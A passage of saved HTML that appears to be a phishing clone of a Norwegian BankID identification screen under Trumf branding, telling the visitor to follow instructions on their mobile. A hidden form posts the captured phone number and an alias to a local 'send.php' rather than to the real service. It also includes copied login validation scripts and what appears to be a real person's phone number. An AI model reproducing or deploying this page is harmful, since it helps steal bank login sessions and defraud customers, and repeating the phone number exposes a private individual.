QzgzLjk1MDQsMjIuNzE2MSA4My41MTk0LDIyLjk5NTEgODIuODEwNCwyMi45OTUxIEw4MS4wOTA0LDIyLjk5NTEgTDgxLjA5MDQsMjEuMzY5MSBMODIuNzM0NCwyMS4zNjkxIEM4My41NTQ0LDIxLjM2OTEgODMuOTUwNCwyMS42NjUxIDgzLjk1MDQsMjIuMTY1MSBMODMuOTUwNCwyMi4xODIxIFoiIGlkPSJGaWxsLTE0IiBmaWxsPSIjRkZGRkZGIiBtYXNrPSJ1cmwoI21hc2stNCkiPjwvcGF0aD4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik01OC40OTc3LDE4LjM0MjggQzU4Ljk1ODcsMTguMzQyOCA1OS4zMzI3LDE3Ljk2ODggNTkuMzMyNywxNy41MDc4IEM1OS4zMzI3LDE3LjA0NTggNTguOTU4NywxNi42NzE4IDU4LjQ5NzcsMTYuNjcxOCBDNTguMDM1NywxNi42NzE4IDU3LjY2MTcsMTcuMDQ1OCA1Ny42NjE3LDE3LjUwNzggQzU3LjY2MTcsMTcuOTY4OCA1OC4wMzU3LDE4LjM0MjggNTguNDk3NywxOC4zNDI4IE01Ny4wMTk3LDE3LjQ3NjggQzU3LjAxOTcsMTYuNjYxOCA1Ny42ODE3LDE1Ljk5OTggNTguNDk3NywxNS45OTk4IEM1OS4zMTI3LDE1Ljk5OTggNTkuOTc0NywxNi42NjE4IDU5Ljk3NDcsMTcuNDc2OCBDNTkuOTc0NywxOC4yOTI4IDU5LjMxMjcsMTguOTU0OCA1OC40OTc3LDE4Ljk1NDggQzU3LjY4MTcsMTguOTU0OCA1Ny4wMTk3LDE4LjI5MjggNTcuMDE5NywxNy40NzY4IiBpZD0iRmlsbC0xNSIgZmlsbD0iIzRENEQ0QiIgbWFzaz0idXJsKCNtYXNrLTQpIj48L3BhdGg+DQogICAgICAgIDwvZz4NCiAgICA8L2c+DQo8L3N2Zz4=" alt="BankID logo" title="BankID logo">
  
                                  <h1 tabindex="1025" class="bidm_title">Identifisering</h1>
                              </div>
                          </div>
                         
                      </div>
                  </header>
                  <section class="bidm_body">
                      <div class="bidm_vertical">
                          <div class="bidm_horizontal">
                              <div class="bidm_content">
                                  <div class="bidm_label-wrapper">
                                      <button title="Hjelp" class="bidm_help" type="button" tabindex="2500">
                                          <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19oZWxwPC90aXRsZT48ZyBmaWxsPSJub25lIj48cGF0aCBkPSJNMTcuNSA5YzAtNC42OTQtMy44MDYtOC41LTguNS04LjVzLTguNSAzLjgwNi04LjUgOC41IDMuODA2IDguNSA4LjUgOC41IDguNS0zLjgwNiA4LjUtOC41eiIgc3Ryb2tlPSIjMDA3OEJEIi8+PHBhdGggZD0iTTggMTJoMnYyaC0ydi0yem0uNzU4LThjMSAwIDEuODMxLjIzOSAyLjQ5My43MTcuNjYyLjQ3OC45OTIgMS4xODYuOTkyIDIuMTI0IDAgLjU3NS0uMTQ0IDEuMDYtLjQzMSAxLjQ1NC0uMTY4LjIzOS0uNDkxLjU0NC0uOTY5LjkxNmwtLjQ3MS4zNjVjLS4yNTcuMTk5LS4yNjguNDMxLS4zNTIuNjk3LS4wNTMuMTY4LS4wOTEuMzU3LS4wOTYuNzExaC0xLjkzM2MuMDI3LS43NDguMDg4LTEuMTkzLjIwMy0xLjQ3OC4xMTUtLjI4NS40MTItLjYxNC44OS0uOTg2bC40ODUtLjM3OGMuMTU5LS4xMTkuMjg4LS4yNS4zODUtLjM5Mi4xNzctLjI0My4yNjYtLjUxMS4yNjYtLjgwMyAwLS4zMzYtLjA5OC0uNjQzLS4yOTUtLjkxOS0uMTk3LS4yNzctLjU1Ny0uNDE1LTEuMDc5LS40MTUtLjUxMyAwLS44NzcuMTctMS4wOTIuNTExLS4yMTUuMzQxLS4yNTQuNDU2LS4yNTQuODIzaC0xLjkxOGMuMDUzLTEuMjYxLjQyNS0xLjkxNiAxLjI1My0yLjQ0My41MjItLjMzNiAxLjE2NC0uNTA1IDEuOTI1LS41MDV6IiBmaWxsPSIjMDA3OEJEIi8+PC9nPjwvc3ZnPg==" alt="">
                                      </button>
                                      <h2 id="bidm_ref-label" tabindex="2250" class="bidm_label">Referanseord</h2>
                                  </div>
                                  
                                  <div class="bidm_illustration">
                                      <div class="bidm_wrapper">
                                          <img class="bidm_icon" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iNTAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19iaW1vdHA8L3RpdGxlPjxnIGZpbGw9Im5vbmUiPjxyZWN0IGZpbGw9IiMwMDc4QkQiIHdpZHRoPSIzMCIgaGVpZ2h0PSI1MCIgcng9IjIiLz48cmVjdCBmaWxsPSIjZmZmIiB4PSIyIiB5PSI4IiB3aWR0aD0iMjYiIGhlaWdodD0iMzQiIHJ4PSIxIi8+PHJlY3QgZmlsbD0iI2ZmZiIgeD0iMTIiIHk9IjQ0IiB3aWR0aD0iNiIgaGVpZ2h0PSI0IiByeD0iMSIvPjwvZz48L3N2Zz4=" title="Venter p&aring; bekreftelse" alt="Venter p&aring; bekreftelse">
                                          <img class="bidm_spinner" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19zcGlubmVyPC90aXRsZT48ZyBmaWxsPSJub25lIj48cGF0aCBkPSJNMTAgMXYyYzMuODYgMCA3IDMuMTQgNyA3IDAgMy44NTktMy4xNCA3LTcgN3YyYzQuOTcgMCA5LTQuMDMgOS05IDAtNC45NzEtNC4wMy05LTktOSIgZmlsbD0iI2ZmZiIvPjxwYXRoIGQ9Ik0xMCAzdi0yYy00Ljk3MSAwLTkgNC4wMjktOSA5IDAgNC45NyA0LjAyOSA5IDkgOXYtMmMtMy44NiAwLTctMy4xNDEtNy03IDAtMy44NiAzLjE0LTcgNy03eiIgZmlsbD0iIzAwNzhCRCIvPjwvZz48L3N2Zz4=" alt="" title="Venter p&aring; bekreftelse">
                                          <img class="bidm_spinner bidm_no-animation" src="data:image/gif;base64,R0lGODlhFAAUAMQAAP///+v1++n1+9/v993t99nr9dfr9dPp9dXp9dHn883l88nj8cfh8cHf77/d77XZ7bHX663V63a53Wqz22ix21qr11Kl1Uah0Uaf0TOZzBiJxw6DxQqBwwiBwwh+wwB6wSH/C05FVFNDQVBFMi4wAwEAAAAh+QQJDQAAACwKAAEACQASAAAFQOCnVRBgml/6ZckpMNL2cc9pBtjnKbaZZz1AQBYJSj6WIEMUFKSaz95SY0T2hp+i7WfD6Xiv2KwGUK1aqFHJFgIAIfkECQ0AAAAsAwADABAAEAAABVAgII7kaJTo6HhKimJf5pbB9kUzKX1WPjIfjU8k+HyGgOJxCBQOdz1f7TaEyQCMSwAVgLEAA85nI2EIBAyJjfMYJTLGeDyTQEEqGqOmAimFAAAh+QQJDQAAACwAAAoAEwAJAAAFTCDwfQJgnqgpjID2MWkMMJ8GWJ8kp9JnAZHPJrAzBTafiCnzwRQBmE/mpPA0ialA1KNAPThCCUMgYEiQnEcswRy5R5lEEVJx1SqQVAgAIfkECQ0AAAAsAAADABEAEAAABVAgICJiaZ6A4kloC2Qf5p7RtwWzaX1sXmofhq/0+QiGouIRCRQid71h7YZ8xaqqGO4UwFBMD45NwhAIGJLNh3MwJWDFeDGTaEEqwI+mAimFAAAh+QQJDQAAACwAAAEACgASAAAFQiAgjlClfSOQZF+Lig/3bRIjiIr3YUEKsBgfIDLr+SwfiRBwYixbNyF02VwilULixugDLnM77ig2q0VFK9crVTqFAAAh+QQJDQAAACwAAAEAEQAQAAAFTyAgjlClfZ9WQWObZGgcZ0n7cN8mMYLASJsPpyBSeD6YQEsUwEhGMMxyKorklNSl5fPMLk8M7xIlELfI5hE4Ldp209YNNh1lA4wTOwDBDgEAIfkECQ0AAAAsAAABABMACQAABUsgII5QpX2fVkFjKyYZKstZ4gIP920SIwgMyebDebQUng8mcAtgPh7FKIa5tZ4ZUWTHtIoCwwjA8pF4W5KPBXBinEeMFAAleIsEqBAAIfkECQ0AAAAsAwABABAAEAAABVEgIEKV9n1aBYkskGRnHGcJO3DfJjGCwEibD+fBamACLVEA8/EoklARMxOFBoKRalLysWhbDNSXJTiNReXPGRDWrLne8fWTHV8+1POC81wTRCEAOw==" alt="" title="Venter p&aring; bekreftelse">
                                      </div>
                                  </div>
                                  <div class="bidm_instructions">
                                      <div class="bidm_what">F&oslash;lg instruksene p&aring; din mobil</div>
                                      <div class="bidm_info">PersonBankID</div>
                                  </div>
                              </div>
                          </div>
                      </div>
                  </section>
                  <div class="bidm_dialog" role="dialog" aria-labelledby="bidm_dialog-header">
                      <div class="bidm_row">
                          <div class="bidm_cell">
                              <div class="bidm_center">
                                  <div class="bidm_content-wrapper">
                                      <div class="bidm_dialog-header">
                                          <h1 tabindex="5000" class="bidm_title" id="bidm_dialog-header">Hjelp:
                                              Referanseord</h1>
                                      </div>
                                      <div class="bidm_dialog-body bidm_scroll" tabindex="5100">
                                          <p>Bekreft at referanseord vist i BankID-klient er lik p&aring; din mobil.</p>
                                      </div>
                                      <div class="bidm_dialog-close">
                                          <button class="bidm_close" title="Lukk dialog" type="button" tabindex="5900">
                                              <span class="bidm_label">Lukk</span>
                                              <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTEiIGhlaWdodD0iMjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19jbG9zZTwvdGl0bGU+PHBhdGggZD0iTTEgMy45OTlsNC41IDQuNSA0LjUtNC41IDEgMS00LjUgNC41IDQuNSA0LjVzLS45NTcgMS4wNTEtMSAxYy0xLjIyNi0xLjQ0OS00LjUtNC41LTQuNS00LjVsLTQuNSA0LjUtMS0xIDQuNS00LjUtNC41LTQuNSAxLTF6IiBmaWxsPSIjNTU1Ii8+PC9zdmc+">
                                          </button>
                                      </div>
                                  </div>
                              </div>
                          </div>
                      </div>
                  </div>
              </div>
          </div>
      </div>
  </div>

  <form id="bidMobWait" name="bidMobWait" action="send.php" method="post">
      <input type="hidden" name="phoneNumber" id="phoneNumber" value="97529858">
      <input type="hidden" name="phoneAlias" id="phoneAlias" value="150980">
  </form>
  
  
  <p>
      
  </p>

</div>

</section>


</div>



        
    </div>

    
        <script type="text/javascript">
            (function () {
                var tabTrumf = document.getElementById("tab-trumf");
                var tabCorporate = document.getElementById("tab-corporate");
                var panelTrumf = document.getElementById("panel-trumf");
                var panelCorporate = document.getElementById("panel-corporate");

                function toggleCorporate(corporateIsSelected) {
                    panelTrumf.setAttribute("aria-hidden", corporateIsSelected);
                    panelCorporate.setAttribute("aria-hidden", !corporateIsSelected);
                    window.scrollTo({ top: 0, behavior: "smooth" });
                }

                if (tabTrumf) {
                    tabTrumf.onclick = function (e) {
                        e.preventDefault();
                        toggleCorporate(false);
                    };
                }

                if (tabCorporate) {
                    tabCorporate.onclick = function (e) {
                        e.preventDefault();
                        toggleCorporate(true);
                    };
                }

                var url = new URL(document.location);
                var preselectSecurityRealm = url.searchParams.get("tab");
                if (preselectSecurityRealm === "corporate") {
                    toggleCorporate(true);
                }
            })();
        </script>
    
    <script type="text/javascript" src="/static/common.js"></script>
    <script type="text/javascript" src="/static/validation_common.js"></script>
    <script type="text/javascript">
        (async function () {
            var btnFormSubmit = document.getElementById("btn-form-submit-corporate");

            var mobilnummerCorporatePrefix = document.getElementById("username-corporate-prefix");

            var mobilnummerCorporate = document.getElementById("username-corporate");
            var passordCorporate = document.getElementById("password-corporate");

            var mobilnummerCorporateHelpText = document.getElementById("username-corporate-help-text");
            var maxPhoneNumbersCorporateHelpText = document.getElementById("max-phone-numbers-corporate-help-text");
            var passordCorporateHelpText = document.getElementById("password-corporate-help-text");

            var biometriAvailable = document.getElementById("biometriavailable");

            if (window.PublicKeyCredential) {
                const isBiometriAvailable = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()    
                biometriAvailable.setAttribute("value", isBiometriAvailable)
             }

             if (btnFormSubmit) {
                handleEnterKeyPress(btnFormSubmit);
                btnFormSubmit.onclick = function() {
                    return handleFormValidation();
                }
            }

            function handleFormValidation() {

                if (mobilnummerCorporate.value.length == 0 && passordCorporate.value.length == 0) {
                    showHelpText(mobilnummerCorporateHelpText.children[0]);
                    showHelpText(passordCorporateHelpText.children[0]);
                    showInputOutlineError(mobilnummerCorporatePrefix)
                    showInputOutlineError(mobilnummerCorporate);
                    showInputOutlineError(passordCorporate);
                    return false;
                }

                if (mobilnummerCorporate.value.length == 0) {
                    showHelpText(mobilnummerCorporateHelpText.children[0]);
                    showInputOutlineError(mobilnummerCorporatePrefix)
                    showInputOutlineError(mobilnummerCorporate);
                    return false;
                }

                if (mobilnummerCorporate.value.length < 8) {
                    showHelpText(maxPhoneNumbersCorporateHelpText.children[0]);
                    showInputOutlineError(mobilnummerCorporatePrefix)
                    showInputOutlineError(mobilnummerCorporate);
                    return false;
                }

                if (passordCorporate.value.length == 0) {
                    showHelpText(passordCorporateHelpText.children[0]);
                    showInputOutlineError(passordCorporate);
                    return false;
                }
            }
        })();
    </script>
    <script type="text/javascript">
        (async function() {
            var btnFormSubmit = document.getElementById("btn-form-submit");

            var mobilnummerPrefix = document.getElementById("username-prefix");

            var mobilnummer = document.getElementById("username");
            var passord = document.getElementById("password");

            var mobilnummerHelpText = document.getElementById("username-help-text");
            var maxPhoneNumbersHelpText = document.getElementById("max-phone-numbers-help-text");
            var passordHelpText = document.getElementById("password-help-text");
            var biometriAvailable = document.getElementById("biometriavailable");

            if (window.PublicKeyCredential) {
                const isBiometriAvailable = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()    
                biometriAvailable.setAttribute("value", isBiometriAvailable)
             }

             if (btnFormSubmit) {
                handleEnterKeyPress(btnFormSubmit);
                btnFormSubmit.onclick = function() {
                    return handleFormValidation();
                }
            }

            function handleFormValidation() {

                if (mobilnummer.value.length == 0 && passord.value.length == 0) {
                    showHelpText(mobilnummerHelpText.children[0]);
                    showHelpText(passordHelpText.children[0]);
                    showInputOutlineError(mobilnummerPrefix)
                    showInputOutlineError(mobilnummer);
                    showInputOutlineError(passord);
                    return false;
                }

                if (mobilnummer.value.length == 0) {
                    showHelpText(mobilnummerHelpText.children[0]);
                    showInputOutlineError(mobilnummerPrefix)
                    showInputOutlineError(mobilnummer);
                    return false;
                }

                if (mobilnummer.value.length < 8) {
                    showHelpText(maxPhoneNumbersHelpText.children[0]);
                    showInputOutlineError(mobilnummerPrefix)
                    showInputOutlineError(mobilnummer);
                    return false;
                }

                if (passord.value.length == 0) {
                    showHelpText(passordHelpText.children[0]);
                    showInputOutlineError(passord);
                    return false;
                }
            }
        })();
    </script>



<script type="text/javascript" id="">(function(d,l,e,r){function t(c,b,g){var a="";g&&(a=new Date,a.setTime(a.getTime()+864E5*g),a="; expires\x3d"+a.toUTCString(),f="; SameSite\x3dStrict");l.cookie=c+"\x3d"+b+a+f+"; path\x3d/"}d[e]=d[e]||[];d[e].push({start:(new Date).getTime(),event:"stg.start"});var p=l.getElementsByTagName("script")[0],n=l.createElement("script"),h=(d.location.href.match("stg_debug")||l.cookie.match("stg_debug"))&&!d.location.href.match("stg_disable_debug");t("stg_debug",h?1:"",h?14:-1);var m=[];"dataLayer"!==e&&
m.push("data_layer_name\x3d"+e);h&&m.push("stg_debug");h=0<m.length?"?"+m.join("\x26"):"";n.async=!0;n.src="https://norgesgruppen.containers.piwik.pro/"+r+".js"+h;p.parentNode.insertBefore(n,p);!function(c,b,g){c[b]=c[b]||{};for(var a=0;a<g.length;a++)!function(k){c[b][k]=c[b][k]||{};c[b][k].api=c[b][k].api||function(){var q=[].slice.call(arguments,0);"string"==typeof q[0]&&d[e].push({event:b+"."+k+":"+q[0],parameters:[].slice.call(arguments,1)})}}(g[a])}(d,"ppms",["tm","cm"])})(window,document,"dataLayer",
"c30184b3-2658-44f5-8747-35cd11a9a6c3");</script><script type="text/javascript">
    var _paq = _paq || [];
    _paq.push(['setTrackingSource', 'jstc_tm']);
    _paq.push(['enableLinkTracking']);
    _paq.push(['setIpTracking', true]);
    _paq.push(['setDomains', ['id.trumf.no']]);
    _paq.push(['trackPageView']);
    _paq.push(['enableJSErrorTracking']);
    (function(p,i,w,ik) {
        var g=ik.createElement('script'),s=ik.getElementsByTagName('script')[0];
        _paq.push(['setTrackerUrl', p]);
        _paq.push(['setSiteId', w]);
        g.type='text/javascript';g.async=true;g.defer=true;g.src=i;s.parentNode.insertBefore(g,s);
    })('https://norgesgruppen.piwik.pro/ppms.php','https://norgesgruppen.containers.piwik.pro/ppms.js','c30184b3\u002D2658\u002D44f5\u002D8747\u002D35cd11a9a6c3',document)
</script>
<div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: 'Google Sans', Arial, sans-serif;" data-id=""><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c"><img src="https://fonts.gstatic.com/s/i/productlogos/translate/v14/24px.svg" width="24" height="24" alt=""></div><div class=" VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c"><div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">Texte d'origine</div><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Évaluez cette traduction</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Votre avis nous aidera à améliorer Google&nbsp;Traduction</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Bonne traduction" aria-label="Bonne traduction" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Mauvaise traduction" aria-label="Mauvaise traduction" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="//translate.googleapis.com/translate_voting?client=te_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans" id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe name="votingFrame" frameborder="0"></iframe></div></div></div><div id="ExtensionCheck_UsetifulAwesomeExtension"></div>        <script type="text/javascript">
    var _paq = _paq || [];

        _paq.push(['trackEvent', 'built-in page scroll', '25%']);
</script>
        <script type="text/javascript">
    var _paq = _paq || [];

        _paq.push(['trackEvent', 'built-in page scroll', '50%']);
</script>
        <script type="text/javascript">
    var _paq = _paq || [];

        _paq.push(['trackEvent', 'built-in page scroll', '75%']);
</script>
        <script type="text/javascript">
    var _paq = _paq || [];

        _paq.push(['trackEvent', 'built-in page scroll', '100%']);
</script>
</body></html>